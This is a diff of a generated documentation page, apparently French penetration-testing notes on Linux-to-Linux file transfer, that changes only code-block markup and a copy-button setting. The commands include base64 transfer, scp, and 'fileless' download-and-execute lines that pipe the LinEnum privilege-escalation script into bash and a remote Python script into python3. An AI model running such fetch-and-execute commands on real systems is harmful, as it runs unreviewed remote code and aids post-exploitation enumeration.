@@ -7604,22 +7604,22 @@
   <h1>Linux vers linux</h1>
 
 <p>Réception de fichier en base64:</p>
-<pre><code class="language-bash">cat $fichier | base64 -w 0;echo
-</code></pre>
-<pre><code class="language-bash">echo -n '$base64' | base64 -d &gt; $fichier
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>cat<span class="w"> </span><span class="nv">$fichier</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="p">;</span><span class="nb">echo</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;$base64&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$fichier</span>
+</span></code></pre></div>
 <p>Télécharger un fichier et l'exécuter (fileless):</p>
-<pre><code class="language-bash">curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
-
-ou 
-
-wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>curl<span class="w"> </span>https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>ou<span class="w"> </span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>wget<span class="w"> </span>-qO-<span class="w"> </span>https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py<span class="w"> </span><span class="p">|</span><span class="w"> </span>python3
+</span></code></pre></div>
 <p>Réception d'un fichier via SSH:</p>
-<pre><code class="language-bash">sudo systemctl start ssh
-</code></pre>
-<pre><code class="language-bash">scp $user@$monIp:$fichier .
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo<span class="w"> </span>systemctl<span class="w"> </span>start<span class="w"> </span>ssh
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>scp<span class="w"> </span><span class="nv">$user</span>@<span class="nv">$monIp</span>:<span class="nv">$fichier</span><span class="w"> </span>.
+</span></code></pre></div>
 
 
 
@@ -7666,7 +7666,7 @@ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
